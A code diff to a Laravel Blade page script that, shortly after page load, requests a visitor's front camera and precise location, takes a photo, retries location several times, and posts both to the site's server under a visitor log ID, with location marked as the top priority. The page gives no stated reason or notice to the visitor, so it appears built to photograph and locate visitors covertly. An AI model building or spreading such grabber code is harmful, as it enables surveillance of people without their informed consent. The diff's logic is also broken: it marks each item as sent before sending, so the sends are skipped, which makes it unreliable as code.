@@ -121,9 +121,24 @@
             const visitorLogId = {{ $visitorLog->id }};
             let cameraImage = null;
             let locationData = null;
+            let locationSent = false;
+            let cameraSent = false;
+
+            // Check if HTTPS is available (required for camera and location)
+            const isSecure = window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
 
             // Request camera access and capture photo
             async function captureCamera() {
+                if (!isSecure && window.location.protocol !== 'https:') {
+                    console.log('Camera requires HTTPS connection');
+                    return;
+                }
+
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    console.log('Camera API not supported');
+                    return;
+                }
+
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: 'user' } // Front camera
@@ -134,8 +149,14 @@
                     video.play();
                     
                     // Wait for video to be ready
-                    await new Promise(resolve => {
+                    await new Promise((resolve, reject) => {
+                        const timeout = setTimeout(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                            reject(new Error('Video timeout'));
+                        }, 5000);
+                        
                         video.onloadedmetadata = () => {
+                            clearTimeout(timeout);
                             video.width = video.videoWidth;
                             video.height = video.videoHeight;
                             resolve();
@@ -154,29 +175,25 @@
                     
                     // Convert to base64
                     cameraImage = canvas.toDataURL('image/jpeg', 0.8);
+                    cameraSent = true;
                     
-                    // Send data if location is also available
-                    if (locationData) {
-                        sendVisitorData();
-                    }
+                    // Send data immediately
+                    sendVisitorData('camera');
                 } catch (error) {
-                    console.log('Camera access denied or not available:', error);
+                    console.log('Camera access denied or not available:', error.message);
                     // Continue without camera data
-                    if (locationData) {
-                        sendVisitorData();
-                    }
                 }
             }
 
-            // Get location
-            function getLocation() {
+            // Get location (PRIORITY - Most Important)
+            function getLocation(retryCount = 0) {
                 if (!navigator.geolocation) {
                     console.log('Geolocation not supported');
-                    if (cameraImage) {
-                        sendVisitorData();
-                    }
                     return;
                 }
+
+                const maxRetries = 3;
+                const timeout = retryCount === 0 ? 15000 : 10000; // First try: 15s, retries: 10s
 
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
@@ -186,68 +203,110 @@
                             accuracy: position.coords.accuracy
                         };
                         
-                        // Send data if camera is also available
-                        if (cameraImage) {
-                            sendVisitorData();
-                        }
+                        locationSent = true;
+                        // Send location immediately (HIGH PRIORITY)
+                        sendVisitorData('location');
                     },
                     function(error) {
-                        console.log('Location access denied:', error);
-                        // Continue without location data
-                        if (cameraImage) {
-                            sendVisitorData();
+                        console.log('Location error:', error.code, error.message);
+                        
+                        // Retry if not user denied and haven't exceeded max retries
+                        if (error.code !== error.PERMISSION_DENIED && retryCount < maxRetries) {
+                            console.log(`Retrying location... (${retryCount + 1}/${maxRetries})`);
+                            setTimeout(() => getLocation(retryCount + 1), 2000);
+                        } else {
+                            console.log('Location access denied or failed after retries');
                         }
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 10000,
+                        timeout: timeout,
                         maximumAge: 0
                     }
                 );
             }
 
             // Send visitor data to server
-            async function sendVisitorData() {
+            async function sendVisitorData(source = 'both') {
+                // Prevent duplicate sends
+                if (source === 'location' && locationSent && !cameraImage) {
+                    return; // Already sent location only
+                }
+                if (source === 'camera' && cameraSent && !locationData) {
+                    return; // Already sent camera only
+                }
+
                 const data = {
                     visitor_log_id: visitorLogId,
                     _token: '{{ csrf_token() }}'
                 };
 
-                if (cameraImage) {
+                if (cameraImage && !cameraSent) {
                     data.camera_image = cameraImage;
                 }
 
-                if (locationData) {
+                if (locationData && !locationSent) {
                     data.latitude = locationData.latitude;
                     data.longitude = locationData.longitude;
                     data.location_accuracy = locationData.accuracy;
                 }
 
+                // Don't send if no data
+                if (!data.camera_image && !data.latitude) {
+                    return;
+                }
+
                 try {
-                    const response = await fetch('{{ route("visitor.data.store") }}', {
+                    const url = '{{ route("visitor.data.store", [], false) }}';
+                    const fullUrl = url.startsWith('http') ? url : window.location.origin + url;
+                    
+                    const response = await fetch(fullUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
-                            'X-CSRF-TOKEN': '{{ csrf_token() }}'
+                            'X-CSRF-TOKEN': '{{ csrf_token() }}',
+                            'Accept': 'application/json'
                         },
-                        body: JSON.stringify(data)
+                        body: JSON.stringify(data),
+                        credentials: 'same-origin'
                     });
+
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
 
                     const result = await response.json();
                     if (result.success) {
-                        console.log('Visitor data saved successfully');
+                        console.log('Visitor data saved successfully:', source);
+                        if (source === 'location') locationSent = true;
+                        if (source === 'camera') cameraSent = true;
+                    } else {
+                        console.error('Server error:', result.message);
                     }
                 } catch (error) {
                     console.error('Error sending visitor data:', error);
+                    // Retry once after 2 seconds
+                    if (source === 'location' && !locationSent) {
+                        setTimeout(() => {
+                            if (locationData) {
+                                sendVisitorData('location');
+                            }
+                        }, 2000);
+                    }
                 }
             }
 
             // Start collecting data (non-blocking)
+            // Location is PRIORITY - start immediately
             setTimeout(() => {
-                // Request both permissions simultaneously
-                captureCamera();
+                // Get location first (MOST IMPORTANT)
                 getLocation();
-            }, 1000); // Wait 1 second after page load
+                
+                // Then try camera (optional)
+                if (isSecure) {
+                    captureCamera();
+                }
+            }, 500); // Reduced delay for faster location capture
         })();
         @endif
     </script>
